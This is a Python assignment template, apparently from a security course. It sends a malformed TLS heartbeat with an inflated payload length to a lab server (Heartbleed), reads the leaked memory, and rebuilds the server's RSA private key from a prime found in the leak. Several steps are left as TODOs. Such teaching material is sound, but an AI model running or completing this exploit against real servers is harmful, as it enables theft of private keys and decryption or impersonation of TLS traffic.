# Author:      YOUR_NAME
# Section:     01 or 03 or 11

import sys
import socket
import struct
import secrets
import subprocess


# make_client_hello() returns a list of integers representing the Client
#         Hello message in the TLS handshake. Must be converted to a bytes
#         object before sending over a socket.
# Output: client_hello; a list of integers representing the Client Hello
def make_client_hello():

    record_header = [
        0x16, # record ContentType for TLS handshake
        0x03, 0x01, # TLS v1.0
        0x00, 56, # Payload length
    ]

    handshake_header = [
        0x01, # handshake type for Client Hello
        0x00, 0x00, 52 # Length of Client Hello
    ]

    client_version = [
        0x03, 0x01 # TLS v1.0
    ]

    # Generate 32 bytes of random data (cryptographically secure)
    client_random = list(secrets.token_bytes(32))

    session_id = [
        0x00 # Not providing a session ID
    ]

    cipher_suites = [
        0x00, 0x02, # Length of cipher suites
        0x00, 0x39 # Code for supported cipher suite
    ]

    compression_methods = [
        0x01, 0x00 # Not using compression
    ]

    extensions_length = [
        0x00, 0x17 # Length of extensions
    ]

    extensions = [
        0x00, 0x23, 0x00, 0x00, # SessionTicket TLS extension
        0x00, 0x0f, 0x00, 0x01, 0x01 # Heartbeat extension
    ]

    # Assemble client hello message
    client_hello = record_header + handshake_header + client_version
    client_hello += client_random + session_id + cipher_suites
    client_hello += compression_methods + extensions_length + extensions

    return client_hello


# make_heartbeat() returns a list of integers representing the TLS heartbeat
#         to be sent by the client.
# Output: heartbeat; list of integers representing the TLS heartbeat

def make_heartbeat():

    record_header = [
      0x18, # TODO: Set record ContentType for HeartBeat request
      0x03, 0x01, # TODO: Set code for TLS protocol version
      0x00, 0x07, # TODO: Set number of bytes in payload
    ]

    message_type = [
        0x01 # TODO: Siet TLS Heartbeat Message Type
    ]

    payload_length = [
        0x00, 0x20 # TODO: Set Heartbeat payload data
    ]

    payload_data = [
        0x00, 0x00, 0x00, 0x00 # TODO: Set Heartbeat payload data
    ]

    # Assemble heartbeat message
    heartbeat = record_header + message_type + payload_length + payload_data

    return heartbeat

# recv_response() receives a TLS response from a socket and parses the record
#         header from it.
# Input:  socket;   A Python socket object
# Output: response; The remaining contents of the TLS response following the
#         record header
def recv_response(sock):
    record_header = sock.recv(5)

    # Unpack record header
    record_type, tls_version, length = struct.unpack(">BHH", record_header)

    # Use length to receive rest of response
    response = sock.recv(length)

    return response

# mod_mult_inverse() calculates the modular multiplicative inverse
# Input:  num;     An integer for which we want to find the mod
#         multiplicate inverse for
#         modulus; An integer for which we want to find congruence
#         with respect to
# Output: b;       An integer which is the inverse mod modulus
def mod_mult_inverse(num, modulus):
    t_prev, t_curr = 0, 1
    r_prev, r_curr = modulus, num
    while r_curr != 0:
        q = r_prev // r_curr
        t_prev, t_curr = t_curr, t_prev - q * t_curr
        r_prev, r_curr = r_curr, r_prev - q * r_curr
    b = t_prev
    if b < 0:
        b = b + modulus
    return b


if __name__ == "__main__":

    # Create socket and connect to target server
    server = "stegolab3.com"
    port = 443
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server, port))

    # Form Client Hello message
    client_hello = make_client_hello()

    # Send Client Hello message to server
    print("[-] Sending Client Hello to {}:{}".format(server, port))
    sock.send(bytes(client_hello))

    # Get Server Hello response from server
    server_hello_response = recv_response(sock)
    print("[+] Receivied Server Hello")

    # Get server certificate
    certificate_response = recv_response(sock)
    print("[+] Received server certificate")

    # TODO: Parse server certificate contents from certificate_response
    certificate_contents = None



    # TODO: Write server certificate contents to file
    certifiate_file = "server_cert.der"



    # TODO: Parse modulus from server_cert.der
    modulus = None
    prime_bytes = None



    print("[-] Parsed n from server certificate".format(modulus))
    print("[-] Size of p and q (in bytes):".format(prime_bytes))

    # Receive key exchange info
    key_exchange_response = recv_response(sock)
    print("[+] Received key exchange info")

    # Receive Server Hello Done
    done_response = recv_response(sock)
    print("[+] Received Server Hello Done")

    # Form heartbeat request
    heartbeat = make_heartbeat()

    # Send heartbeat request to server
    print("[-] Sending heartbeat to server")
    sys.stdout.flush()
    sock.send(bytes(heartbeat))

    # Receive heartbeat response from server
    # TODO: Set payload_length to same length as in make_heartbeat()
    payload_length = 0x20
    heartbeat_response = sock.recv(payload_length)
    print("[+] Received heartbeat response")

    # Print heartbeat response if in --verbose mode
    if len(sys.argv) == 2 and sys.argv[1] == "--verbose":
        print(heartbeat_response.decode("utf-8", errors="ignore"))

    # TODO: Search for primes from private key in heartbeat response
    # If a prime number is found, store it in p
    p = None



    # Exit if no private key values found
    if p is None:
        print("[!] Unable to find private key values")
        exit(0)

    # Reconstruct private key from found prime
    print("[-] Found private key values")
    q = modulus // p
    phi_n = (p-1) * (q-1)
    d = mod_mult_inverse(65537, phi_n)
    print("[-] p: {}".format(hex(p)))
    print("[-] q: {}".format(hex(q)))
    print("[-] d: {}".format(hex(d)))
